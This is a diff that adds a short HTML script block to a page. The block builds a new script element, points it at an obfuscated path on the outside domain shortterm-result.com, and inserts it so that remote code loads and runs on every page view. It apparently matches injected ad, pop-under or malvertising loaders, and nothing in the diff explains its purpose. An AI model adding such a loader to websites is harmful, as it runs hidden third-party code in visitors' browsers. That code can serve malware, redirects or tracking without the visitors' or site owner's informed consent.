@@ -1,0 +1,12 @@
+<script>
+(function(yev){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = yev || {};
+s.src = "\/\/shortterm-result.com\/bxXvV.sddVGPlj0\/Y\/Wncc\/qeim-9yuHZcUYlCk\/PET\/Yj1\/N_j\/guxvO\/TdMmtXN\/jWUp2WOJDtEF5\/NoAr";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
